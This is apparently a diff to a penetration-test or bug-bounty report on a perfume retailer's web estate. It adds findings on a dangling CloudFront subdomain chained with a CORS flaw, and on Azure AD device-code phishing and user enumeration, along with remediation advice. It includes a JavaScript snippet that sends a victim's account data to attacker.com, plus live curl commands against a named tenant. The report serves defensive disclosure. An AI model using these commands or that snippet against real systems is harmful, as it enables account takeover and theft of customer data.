@@ -570,6 +570,154 @@ Backend also reveals in JavaScript:
 
 ---
 
+## Finding #12: Subdomain Takeover via Dangling CloudFront CNAME — CORS Chain to Critical
+**Severity**: Critical (Subdomain Takeover + Credential Theft Chain)
+**Domain**: refer.theperfumeshop.com
+
+### Description
+The subdomain `refer.theperfumeshop.com` has a DNS CNAME record pointing to `d21ht8kxzkwbio.cloudfront.net`, a CloudFront distribution that no longer exists. The CloudFront distribution domain returns no A records (only SOA), confirming it has been disabled or deleted while the DNS record remains. An attacker can create a new CloudFront distribution, add `refer.theperfumeshop.com` as an alternate domain name, and serve arbitrary content under the trusted `*.theperfumeshop.com` domain.
+
+**This finding chains directly with Finding #10 (CORS wildcard with credentials) to escalate from subdomain takeover to full authenticated API credential theft — making this a Critical chain.**
+
+### Steps to Reproduce
+1. Query the CNAME record:
+   ```
+   $ curl -s "https://dns.google/resolve?name=refer.theperfumeshop.com&type=CNAME"
+   {"Answer":[{"name":"refer.theperfumeshop.com.","type":5,"TTL":1800,"data":"d21ht8kxzkwbio.cloudfront.net."}]}
+   ```
+2. Verify the CloudFront distribution is dead (no A records):
+   ```
+   $ curl -s "https://dns.google/resolve?name=d21ht8kxzkwbio.cloudfront.net&type=A"
+   {"Authority":[{"name":"cloudfront.net.","type":6,"TTL":60,"data":"ns-418.awsdns-52.com. hostmaster.cloudfront.net. ..."}]}
+   # No Answer section = no A record = distribution deleted/disabled
+   ```
+3. Compare with an active CloudFront distribution (from techsale CSP):
+   ```
+   $ curl -s "https://dns.google/resolve?name=d2q01ftr6ua4w.cloudfront.net&type=A"
+   {"Answer":[{"data":"3.170.21.64"},{"data":"3.170.21.135"},{"data":"3.170.21.71"},{"data":"3.170.21.47"}]}
+   # Active distribution returns 4 edge IPs
+   ```
+4. Takeover: create a new CloudFront distribution with `refer.theperfumeshop.com` as an alternate domain, configure an ACM certificate, and point the origin to attacker-controlled content.
+
+### Attack Chain (Finding #12 + Finding #10 = Critical)
+```
+1. Attacker claims refer.theperfumeshop.com via CloudFront subdomain takeover
+2. Attacker hosts malicious JavaScript at https://refer.theperfumeshop.com/steal.html
+3. Victim visits attacker page (via phishing link or redirect)
+4. JavaScript executes under *.theperfumeshop.com origin
+5. CORS policy allows the request with credentials (Finding #10):
+   - Origin: https://refer.theperfumeshop.com → reflected in access-control-allow-origin
+   - access-control-allow-credentials: true
+6. JavaScript fetches authenticated API endpoints:
+
+   fetch('https://api.theperfumeshop.com/api/v2/tpsgb/users/current', {
+     credentials: 'include'
+   }).then(r => r.json()).then(data => {
+     // Exfiltrate: name, email, phone, addresses, orders, saved payments
+     new Image().src = 'https://attacker.com/log?' + btoa(JSON.stringify(data));
+   });
+```
+
+### Impact
+- **Critical**: Full credential theft chain — attacker reads victim's authenticated API data (PII, orders, saved payment methods, addresses) from the main e-commerce platform
+- **Critical**: Actions as victim — attacker can modify cart, change delivery address, place fraudulent orders
+- **High**: Persistent control — once the subdomain is taken over, the attacker maintains long-term control until the DNS record is removed or the distribution is reclaimed
+- **High**: No detection — requests appear to originate from a legitimate theperfumeshop.com subdomain; Akamai WAF and CORS policies treat them as trusted
+
+### CVSS 4.0
+**9.3** (Critical) - CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N
+
+### Recommendation
+1. **Immediate**: Remove the DNS CNAME record for `refer.theperfumeshop.com` → `d21ht8kxzkwbio.cloudfront.net`
+2. **Immediate**: Audit ALL DNS records for other dangling CNAMEs pointing to deprovisioned cloud services
+3. **Immediate**: Fix the CORS wildcard pattern (Finding #10) — this eliminates the chain even if other subdomains are compromised
+4. **Short-term**: Implement DNS record lifecycle management — automatically remove CNAMEs when cloud resources are deprovisioned
+5. **Short-term**: Enable AWS CloudFront Origin Access Control and domain verification to prevent unauthorized distribution claims
+
+---
+
+## Finding #13: Azure AD Misconfiguration — Device Code Phishing, ROPC User Enumeration, Elevated Scope Requests
+**Severity**: High (Account Takeover via Phishing + User Enumeration)
+**Domain**: techsale.theperfumeshop.com (Supabase OAuth → Azure AD)
+
+### Description
+The Azure AD application registration used by techsale's Supabase OAuth (client_id: `7053b019-d535-4ade-ad68-a6d266e7ad68`, tenant: `5c8208f9-b560-4909-903b-5a5cc5b1d45a`) has multiple dangerous authentication flows enabled:
+
+1. **Device Code Flow**: Allows an attacker to generate device codes that trick employees into authenticating on the attacker's behalf. The victim is shown a legitimate Microsoft login page and a device code, and after authenticating, the attacker receives their OAuth tokens.
+
+2. **ROPC (Resource Owner Password Credentials) Grant**: Enables direct username/password authentication without browser interaction, bypassing MFA unless enforced at the Conditional Access level. This enables credential stuffing and brute force attacks.
+
+3. **User Enumeration**: The ROPC endpoint returns different error codes for existing vs. non-existing users (50053 "locked" vs. 50034 "does not exist"), enabling username enumeration.
+
+4. **Elevated Scope Acceptance**: Device code generation accepts arbitrary Microsoft Graph scopes including `Mail.Read`, `Files.ReadWrite.All`, and `https://graph.microsoft.com/.default` — the victim would be prompted to consent to these permissions.
+
+### Steps to Reproduce
+
+**Device Code Phishing:**
+```bash
+# Generate a device code — victim enters this at https://login.microsoft.com/device
+$ curl -X POST "https://login.microsoftonline.com/5c8208f9-b560-4909-903b-5a5cc5b1d45a/oauth2/v2.0/devicecode" \
+  -d "client_id=7053b019-d535-4ade-ad68-a6d266e7ad68&scope=openid profile email"
+
+{"user_code":"L7JA2TMSL","device_code":"LBgABIQ...","verification_uri":"https://login.microsoft.com/device","expires_in":900}
+```
+
+**Elevated Scope Device Code:**
+```bash
+# Request dangerous scopes — Mail.Read, Files.ReadWrite.All
+$ curl -X POST "https://login.microsoftonline.com/5c8208f9-b560-4909-903b-5a5cc5b1d45a/oauth2/v2.0/devicecode" \
+  -d "client_id=7053b019-d535-4ade-ad68-a6d266e7ad68&scope=openid profile email Mail.Read Files.ReadWrite.All"
+
+{"user_code":"GQZ8WJRSU",...}  # Accepted — victim would be prompted for consent
+```
+
+**ROPC User Enumeration:**
+```bash
+# Existing user returns 50053 (locked)
+$ curl -X POST "https://login.microsoftonline.com/5c8208f9-b560-4909-903b-5a5cc5b1d45a/oauth2/v2.0/token" \
+  -d "grant_type=password&client_id=7053b019-d535-4ade-ad68-a6d266e7ad68&scope=openid&username=admin@tps.com&password=test"
+
+{"error_codes":[50053],"error_description":"The account is locked..."}
+
+# Non-existing user returns 50034
+$ curl -X POST "..." -d "...&username=nonexistent@tps.com&password=test"
+
+{"error_codes":[50034],"error_description":"The user account does not exist..."}
+```
+
+**Domain Discovery:**
+- `tps.com` is a verified domain in the tenant (error 50053 for admin@ = user exists)
+- `theperfumeshop.com` is NOT in this tenant (error 50034 for all users)
+- `aswatson.com` is NOT in this tenant
+
+### Evidence
+| Test | Error Code | Meaning |
+|------|-----------|---------|
+| admin@tps.com | 50053 | User EXISTS (account locked) |
+| test@tps.com | 50034 | User does NOT exist |
+| admin@theperfumeshop.com | 50034 | Domain not in tenant |
+| admin@aswatson.com | 50034 | Domain not in tenant |
+
+### Impact
+- **High**: Device code phishing enables account takeover — attacker generates codes and phishes employees into authenticating, gaining access to corporate resources (email, files, internal apps)
+- **High**: ROPC enables credential stuffing — with enumerated usernames, an attacker can attempt password spraying directly against the API without browser interaction
+- **High**: User enumeration reveals valid corporate accounts — attackers can build targeted username lists for phishing and password attacks
+- **Medium**: Elevated scope requests could escalate access — a phished employee consenting to `Mail.Read` or `Files.ReadWrite.All` gives the attacker access to corporate email and OneDrive
+- **Medium**: The `tps.com` domain revelation expands the attack surface beyond `theperfumeshop.com`
+
+### CVSS 4.0
+**8.1** (High) - CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N
+
+### Recommendation
+1. **Immediate**: Disable Device Code Flow on the application registration (Azure Portal → App registrations → Authentication → Advanced settings → Allow public client flows = No)
+2. **Immediate**: Disable ROPC grant type or enforce Conditional Access policies requiring MFA for all authentication flows
+3. **Short-term**: Enable Smart Lockout with lower thresholds to slow user enumeration
+4. **Short-term**: Restrict the application's API permissions to only required scopes (openid, profile, email) and require admin consent for any additional Graph permissions
+5. **Medium-term**: Implement Conditional Access policies blocking device code flow and ROPC for all users
+6. **Medium-term**: Enable Azure AD sign-in risk detection to alert on suspicious authentication patterns
+
+---
+
 ## Additional Observations
 
 ### Akamai WAF (AkamaiGHost)
@@ -601,27 +749,33 @@ Backend also reveals in JavaScript:
 - Klarna
 - Clearpay/Afterpay
 
-### Subdomain Status (502 Bad Gateway - Potential Takeover)
-- videogift.theperfumeshop.com
-- refer.theperfumeshop.com
-- prod-cc.theperfumeshop.com
-- prod-k.theperfumeshop.com
-- bp.theperfumeshop.com
-- bpie.theperfumeshop.com
-- promotions.theperfumeshop.com
+### Subdomain DNS Status (Dangling CNAMEs and Unresolvable Hosts)
+| Subdomain | DNS Status | CNAME Target | Takeover Risk |
+|-----------|-----------|--------------|---------------|
+| refer.theperfumeshop.com | CNAME exists, target dead | d21ht8kxzkwbio.cloudfront.net | **CRITICAL** — CloudFront takeover (Finding #12) |
+| prod-cc.theperfumeshop.com | No A record (SOA only) | None (Akamai-managed) | Low |
+| bp.theperfumeshop.com | No A record (SOA only) | None (Akamai-managed) | Low |
+| bpie.theperfumeshop.com | No A record (SOA only) | None (Akamai-managed) | Low |
+| videogift.theperfumeshop.com | NXDOMAIN | None | N/A (record deleted) |
+| prod-k.theperfumeshop.com | NXDOMAIN | None | N/A (record deleted) |
+| promotions.theperfumeshop.com | NXDOMAIN | None | N/A (record deleted) |
 
 ---
 
 ## Recommendations (Priority Order)
-1. **CRITICAL**: Replace wildcard subdomain CORS pattern (`*.theperfumeshop.com`) on api/media infrastructure with explicit origin allowlist (Finding #10)
-2. **CRITICAL**: Disable GitHub, Google, and Twitter authentication providers on scentral.theperfumeshop.com via `staticwebapp.config.json` route blocks (Finding #7)
-3. **CRITICAL**: Restrict Azure AD authentication on scentral from `/common/` (multi-tenant) to the organization's specific tenant ID (Finding #7)
-4. **HIGH**: Implement server-side authorization scope validation on techsale OAuth flow; do not pass scope as client-controlled parameter (Finding #8)
-5. **HIGH**: Decommission or secure abandoned subdomains returning 502 (videogift, refer, prod-cc, prod-k, bp, bpie) to reduce CORS attack surface (Finding #10)
-6. **Immediate**: Fix the internal origin leak on connect by setting `NEXTAUTH_URL` to the public-facing URL (Finding #1)
-7. **Immediate**: Remove SAP Commerce Cloud backend hostname from client-side JavaScript (Finding #11)
-8. **Short-term**: Harden campaigns.theperfumeshop.com - disable directory listing, remove default Apache test page, or decommission (Finding #10 chain)
-9. **Short-term**: Strip Supabase project identifiers from cookie names and CSP headers (Finding #2, #9)
-10. **Short-term**: Remove stale Lync/SfB DNS records (Finding #4)
-11. **Medium-term**: Review Supabase RLS policies for the techsale application
-12. **Medium-term**: Configure SAP Commerce Cloud backend to reject requests not from Akamai CDN
+1. **CRITICAL**: Remove the DNS CNAME for `refer.theperfumeshop.com` → `d21ht8kxzkwbio.cloudfront.net` immediately — dangling CloudFront CNAME enables subdomain takeover (Finding #12)
+2. **CRITICAL**: Replace wildcard subdomain CORS pattern (`*.theperfumeshop.com`) on api/media infrastructure with explicit origin allowlist — this eliminates the takeover→credential theft chain (Finding #10 + #12)
+3. **CRITICAL**: Disable GitHub, Google, and Twitter authentication providers on scentral.theperfumeshop.com via `staticwebapp.config.json` route blocks (Finding #7)
+4. **CRITICAL**: Restrict Azure AD authentication on scentral from `/common/` (multi-tenant) to the organization's specific tenant ID (Finding #7)
+5. **HIGH**: Disable Device Code Flow and ROPC grant on the techsale Azure AD app registration (Finding #13)
+6. **HIGH**: Implement server-side authorization scope validation on techsale OAuth flow; do not pass scope as client-controlled parameter (Finding #8)
+7. **HIGH**: Decommission or secure abandoned subdomains and audit ALL DNS records for dangling CNAMEs (Findings #10, #12)
+8. **Immediate**: Fix the internal origin leak on connect by setting `NEXTAUTH_URL` to the public-facing URL (Finding #1)
+9. **Immediate**: Remove SAP Commerce Cloud backend hostname from client-side JavaScript (Finding #11)
+10. **Short-term**: Harden campaigns.theperfumeshop.com - disable directory listing, remove default Apache test page, or decommission (Finding #10 chain)
+11. **Short-term**: Strip Supabase project identifiers from cookie names and CSP headers (Finding #2, #9)
+12. **Short-term**: Remove stale Lync/SfB DNS records (Finding #4)
+13. **Short-term**: Enforce Conditional Access policies requiring MFA for all authentication flows including ROPC and device code (Finding #13)
+14. **Medium-term**: Review Supabase RLS policies for the techsale application
+15. **Medium-term**: Configure SAP Commerce Cloud backend to reject requests not from Akamai CDN
+16. **Medium-term**: Implement DNS record lifecycle management — auto-remove CNAMEs when cloud resources are deprovisioned
